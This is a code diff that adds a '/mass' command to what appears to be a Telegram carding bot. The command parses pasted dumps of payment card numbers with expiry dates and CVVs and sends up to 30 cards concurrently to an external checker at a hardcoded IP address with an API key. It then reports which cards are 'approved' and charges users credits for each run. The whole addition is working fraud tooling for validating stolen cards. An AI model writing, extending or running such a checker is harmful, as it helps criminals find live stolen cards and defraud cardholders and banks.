@@ -1474,6 +1474,181 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+import asyncio
+import re
+import aiohttp
+import time
+from telegram import Update
+from telegram.ext import ContextTypes
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown as escape_markdown_v2
+from datetime import datetime
+
+# You must have your `db.py` file with the `get_user` and `update_user` functions
+# in the same directory for this code to work.
+from db import get_user, update_user
+
+# Global variable for user cooldowns
+user_cooldowns = {}
+
+async def check_authorization(update, context):
+    """Placeholder function to check if the user is authorized."""
+    # This function is retained from your original code.
+    return True
+
+async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
+    """Enforces a cooldown period for a user to prevent spamming."""
+    last_run = user_cooldowns.get(user_id, 0)
+    now = datetime.now().timestamp()
+    if now - last_run < cooldown_seconds:
+        await update.effective_message.reply_text(
+            escape_markdown_v2(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds."),
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        return False
+    user_cooldowns[user_id] = now
+    return True
+
+async def consume_credit(user_id: int) -> bool:
+    """
+    Consume 1 credit from DB user if available.
+    """
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) > 0:
+        new_credits = user_data["credits"] - 1
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
+
+async def check_card_on_api(card):
+    """
+    Checks a single card on an external API and returns the raw status message.
+    
+    Args:
+        card (str): The card string in the format "number|mm|yy|cvv".
+    
+    Returns:
+        tuple: (card_string, status_message)
+    """
+    base_url = "http://31.97.66.195:8000/"
+    api_key = "k4linuxx"
+    
+    # URL-encode the card string for the query parameter
+    encoded_card = card.replace('|', '%7C')
+    
+    # Construct the full URL
+    url = f"{base_url}?key={api_key}&card={encoded_card}"
+    
+    try:
+        # Use aiohttp to make an asynchronous HTTP request
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, timeout=25) as response:
+                response_json = await response.json()
+                
+                # Return the card string and the raw status message from the API
+                status = response_json.get("status", "UNKNOWN")
+                return card, status
+    except Exception as e:
+        print(f"Error checking card {card}: {e}")
+        return card, f"API Error"
+
+async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Checks a list of 30 cards using an API and provides a summary.
+    This command requires a single credit to run.
+    """
+    # Initial checks: authorization, cooldown, and credits.
+    if not await check_authorization(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    if not await enforce_cooldown(user_id, update):
+        return
+
+    # Check and consume credit in one step using your provided logic
+    user_data = await get_user(user_id)
+    if user_data.get('credits', 0) <= 0:
+        return await update.effective_message.reply_text(
+            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        
+    if not await consume_credit(user_id):
+        return await update.effective_message.reply_text(
+            escape_markdown_v2("❌ An error occurred while deducting credits. Please try again."),
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    # Check if the user has provided a dump or replied to one.
+    if update.message.reply_to_message and update.message.reply_to_message.text:
+        dump = update.message.reply_to_message.text
+    elif context.args:
+        dump = " ".join(context.args)
+    else:
+        return await update.effective_message.reply_text(
+            escape_markdown_v2("❌ Please provide or reply to a dump containing cards. Usage: `/mass <dump or reply>`"),
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    # Regex to find cards: number|mm|yy|cvv
+    card_pattern = re.compile(r"\b(\d{13,16})\|(\d{1,2})\|(\d{2}|\d{4})\|(\d{3,4})\b")
+    cards_found = ["{}|{}|{}|{}".format(m[0], m[1].zfill(2), m[2][-2:], m[3]) for m in card_pattern.findall(dump)]
+
+    if not cards_found:
+        return await update.effective_message.reply_text(
+            escape_markdown_v2("❌ No valid cards were found in the provided text."),
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+    
+    # Limit to the first 30 cards found
+    cards_to_check = cards_found[:30]
+
+    processing_msg = await update.effective_message.reply_text(
+        escape_markdown_v2(f"✅ Found {len(cards_to_check)} cards. Starting mass check..."),
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+    
+    # Process cards concurrently and get both card and status
+    results = await asyncio.gather(*[check_card_on_api(card) for card in cards_to_check])
+
+    # Categorize results based on the status message
+    approved_cards = []
+    declined_cards = []
+    unknown_cards = []
+    
+    for card, status in results:
+        if "Declined" in status:
+            declined_cards.append((card, status))
+        elif "API Error" in status or status == "UNKNOWN":
+            unknown_cards.append((card, status))
+        else:
+            approved_cards.append((card, status))
+    
+    # Build the final message with detailed statuses
+    approved_list = "\n".join([f"✅ `{escape_markdown_v2(card)}`\n   *Status:* `{escape_markdown_v2(status)}`" for card, status in approved_cards])
+    declined_list = "\n".join([f"❌ `{escape_markdown_v2(card)}`\n   *Status:* `{escape_markdown_v2(status)}`" for card, status in declined_cards])
+    unknown_list = "\n".join([f"❔ `{escape_markdown_v2(card)}`\n   *Status:* `{escape_markdown_v2(status)}`" for card, status in unknown_cards])
+    
+    summary_message = (
+        f"╭━━━[ 📊 *𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐑𝐞𝐬𝐮𝐥𝐭𝐬* ]━━━⬣\n"
+        f"┣ ❏ *𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬:* `{len(cards_to_check)}`\n"
+        f"┣ ❏ *𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:* `{len(approved_cards)}`\n"
+        f"┣ ❏ *𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:* `{len(declined_cards)}`\n"
+        f"┣ ❏ *𝐔𝐧𝐤𝐧𝐨𝐰𝐧:* `{len(unknown_cards)}`\n"
+        f"╰━━━━━━━━━━━━━━━━━━━⬣\n\n"
+        f"✅ *𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐂𝐚𝐫𝐝𝐬:*\n{approved_list}\n\n"
+        f"❌ *𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐂𝐚𝐫𝐝𝐬:*\n{declined_list}\n\n"
+        f"❔ *𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐂𝐚𝐫𝐝𝐬:*\n{unknown_list}"
+    )
+
+    await processing_msg.edit_text(
+        summary_message,
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+�
+
+
+
 from faker import Faker
 
 async def fk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
